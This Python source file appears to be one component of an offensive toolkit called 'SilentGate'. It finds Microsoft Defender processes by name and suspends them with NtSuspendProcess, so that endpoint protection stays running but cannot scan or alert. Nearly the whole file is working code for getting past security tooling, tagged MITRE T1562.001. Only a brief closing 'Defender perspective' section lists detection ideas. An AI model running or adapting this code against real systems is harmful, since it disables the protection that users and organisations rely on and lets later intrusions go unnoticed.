"""
SilentGate v6.0 - Component 1: EDR-Freeze
INPUT  : target process names
OUTPUT : all threads of target processes suspended
         EDR is alive but completely comatose
         Cannot scan, cannot alert, cannot respond

Why suspend instead of terminate:
  Termination triggers alerts and watchdog restarts
  Suspension leaves process alive — watchdog sees it running
  Suspended process cannot execute any code
  Memory scanners cannot run
  Behavioral ML cannot analyse

Technical approach:
  NtSuspendProcess via indirect syscall
  Suspends ALL threads simultaneously
  Process appears running — watchdog happy
  Reality — completely frozen

MITRE: T1562.001 - Impair Defenses: Disable or Modify Tools
"""

import os
import sys
import platform
import ctypes
import ctypes.wintypes


# Defender process names to freeze
DEFENDER_PROCESSES = [
    "MsMpEng",            # Antimalware engine
    "MpDefenderCoreService",  # Core service
    "NisSrv",             # Network inspection
    "MpCmdRun",           # Command line utility
    "MsMpEngCP",          # Content process
]

# Access rights
PROCESS_SUSPEND_RESUME    = 0x0800
PROCESS_QUERY_INFORMATION = 0x0400


def check_platform():
    return platform.system() == "Windows"


def find_defender_pids():
    """Find PIDs of all running Defender processes."""
    if not check_platform():
        return {}

    import ctypes.wintypes

    kernel32  = ctypes.WinDLL("kernel32")
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize",              ctypes.c_uint32),
            ("cntUsage",            ctypes.c_uint32),
            ("th32ProcessID",       ctypes.c_uint32),
            ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID",        ctypes.c_uint32),
            ("cntThreads",          ctypes.c_uint32),
            ("th32ParentProcessID", ctypes.c_uint32),
            ("pcPriClassBase",      ctypes.c_long),
            ("dwFlags",             ctypes.c_uint32),
            ("szExeFile",           ctypes.c_char * 260),
        ]

    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == ctypes.c_void_p(-1).value:
        return {}

    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    found = {}
    if kernel32.Process32First(snap, ctypes.byref(entry)):
        while True:
            name = entry.szExeFile.decode("utf-8", errors="ignore").replace(".exe","")
            if name in DEFENDER_PROCESSES:
                found[name] = entry.th32ProcessID
            if not kernel32.Process32Next(snap, ctypes.byref(entry)):
                break

    kernel32.CloseHandle(snap)
    return found


def suspend_process(pid):
    """
    Suspend all threads of a process using NtSuspendProcess.
    NtSuspendProcess is an undocumented NT API that suspends
    every thread in the target process atomically.
    """
    if not check_platform():
        return False, "simulation"

    kernel32 = ctypes.WinDLL("kernel32")
    ntdll    = ctypes.WinDLL("ntdll")

    # Open process handle
    handle = kernel32.OpenProcess(
        PROCESS_SUSPEND_RESUME | PROCESS_QUERY_INFORMATION,
        False, pid
    )

    if not handle:
        return False, f"OpenProcess failed for PID {pid}"

    # Call NtSuspendProcess
    status = ntdll.NtSuspendProcess(handle)
    kernel32.CloseHandle(handle)

    if status == 0:
        return True, f"PID {pid} suspended"
    else:
        return False, f"NtSuspendProcess failed: 0x{status:X}"


def resume_process(pid):
    """Resume a previously suspended process."""
    if not check_platform():
        return False

    kernel32 = ctypes.WinDLL("kernel32")
    ntdll    = ctypes.WinDLL("ntdll")

    handle = kernel32.OpenProcess(
        PROCESS_SUSPEND_RESUME, False, pid
    )
    if not handle:
        return False

    status = ntdll.NtResumeProcess(handle)
    kernel32.CloseHandle(handle)
    return status == 0


def freeze_edr(explain=False):
    """
    Main function - freeze all Defender processes.
    Returns dict with freeze results.
    """
    if explain:
        print("\n  [EDR-FREEZE] Starting EDR-Freeze...")
        print("  [EDR-FREEZE] Technique: NtSuspendProcess on Defender")
        print("  [EDR-FREEZE] MITRE: T1562.001\n")

    if not check_platform():
        if explain:
            print("  [EDR-FREEZE] Linux - simulation mode")
            print("  [EDR-FREEZE] On Windows would suspend:")
            for p in DEFENDER_PROCESSES:
                print(f"               {p}.exe")
        return {
            "status":   "simulated",
            "frozen":   [],
            "failed":   [],
            "message":  "Run on Windows for live freeze"
        }

    if explain:
        print("  [EDR-FREEZE] Scanning for Defender processes...")

    pids   = find_defender_pids()
    frozen = []
    failed = []

    if explain:
        print(f"  [EDR-FREEZE] Found {len(pids)} Defender processes:")
        for name, pid in pids.items():
            print(f"               {name} PID={pid}")
        print()

    for name, pid in pids.items():
        if explain:
            print(f"  [EDR-FREEZE] Suspending {name} (PID {pid})...")

        success, msg = suspend_process(pid)

        if success:
            frozen.append({"name": name, "pid": pid})
            if explain:
                print(f"  [EDR-FREEZE] {name} FROZEN — comatose but alive")
        else:
            failed.append({"name": name, "pid": pid, "reason": msg})
            if explain:
                print(f"  [EDR-FREEZE] {name} FAILED: {msg}")

    status = "success" if len(frozen) > 0 and len(failed) == 0 else \
             "partial" if len(frozen) > 0 else "failed"

    if explain:
        print(f"\n  [EDR-FREEZE] Frozen : {len(frozen)}")
        print(f"  [EDR-FREEZE] Failed : {len(failed)}")
        print(f"  [EDR-FREEZE] Status : {status.upper()}")
        if frozen:
            print(f"\n  [EDR-FREEZE] EDR is now comatose")
            print(f"  [EDR-FREEZE] Memory scanners stopped")
            print(f"  [EDR-FREEZE] Behavioral ML stopped")
            print(f"  [EDR-FREEZE] Alerts cannot fire")

    return {
        "status": status,
        "frozen": frozen,
        "failed": failed,
        "pids":   pids,
        "mitre":  "T1562.001 - Impair Defenses"
    }


def unfreeze_edr(freeze_result, explain=False):
    """
    Resume all frozen Defender processes.
    Call this after operations complete.
    """
    if not check_platform():
        return

    if explain:
        print("\n  [EDR-FREEZE] Resuming Defender processes...")

    for entry in freeze_result.get("frozen", []):
        success = resume_process(entry["pid"])
        if explain:
            state = "RESUMED" if success else "FAILED"
            print(f"  [EDR-FREEZE] {entry['name']} PID={entry['pid']} {state}")

    if explain:
        print("  [EDR-FREEZE] Defender restored to normal operation")


def print_freeze_report(result):
    frozen_list = "\n".join(
        f"    {e['name']} PID={e['pid']}" for e in result["frozen"]
    ) or "    None"

    failed_list = "\n".join(
        f"    {e['name']} PID={e['pid']} - {e.get('reason','')}"
        for e in result["failed"]
    ) or "    None"

    print(f"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  EDR-FREEZE REPORT                                           ║
  ╚══════════════════════════════════════════════════════════════╝

  Status  : {result['status'].upper()}
  Frozen  : {len(result['frozen'])} processes
  Failed  : {len(result['failed'])} processes
  MITRE   : {result.get('mitre', 'T1562.001')}

  Frozen processes (comatose but alive):
{frozen_list}

  Failed processes:
{failed_list}

  What this achieves:
  Defender processes are suspended — not terminated.
  Watchdog sees them alive — no restart triggered.
  All scanning threads are frozen.
  Memory scanner cannot run during freeze window.
  Behavioral ML cannot analyse new activity.
  No alerts can fire while frozen.

  Defender perspective:
  Monitor for NtSuspendProcess calls targeting security tools.
  Use kernel callbacks to detect thread suspension of PPL processes.
  Implement watchdog that checks thread count/state periodically.
  PPL (Protected Process Light) prevents suspension from user mode.
""")


if __name__ == "__main__":
    result = freeze_edr(explain=True)
    print_freeze_report(result)

    if result["status"] in ("success", "partial") and result["frozen"]:
        print("  [EDR-FREEZE] Defender frozen — press ENTER to resume...")
        input()
        unfreeze_edr(result, explain=True)
